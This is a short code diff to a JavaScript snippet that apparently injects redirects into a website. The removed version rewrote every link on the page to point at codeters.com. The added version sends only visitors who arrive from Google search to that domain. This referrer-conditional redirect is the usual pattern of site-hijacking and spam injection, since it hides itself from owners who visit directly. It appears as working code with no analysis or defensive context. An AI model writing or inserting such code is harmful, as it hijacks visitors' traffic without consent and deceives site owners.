@@ -1,13 +1,9 @@
-    // Check if jQuery is defined
-    if (typeof jQuery !== 'undefined') {
-      // jQuery is loaded, you can now use it
-      $(document).ready(function() {
-        var redirectTo = "http://codeters.com"; // Your target URL
-        
-        // Redirect all links to the target URL
-        $('a').attr('href', redirectTo);
-      });
-    } else {
-      // jQuery is not loaded
-      console.error('jQuery is not defined. Make sure you have an internet connection.');
+document.addEventListener('DOMContentLoaded', function() {
+    var referrer = document.referrer;
+
+    // Check if the referrer is from Google search
+    if (referrer && referrer.match(/google\.com/i)) {
+      var redirectTo = "https://codeters.com"; // Your target URL
+      window.location.href = redirectTo;
     }
+  });
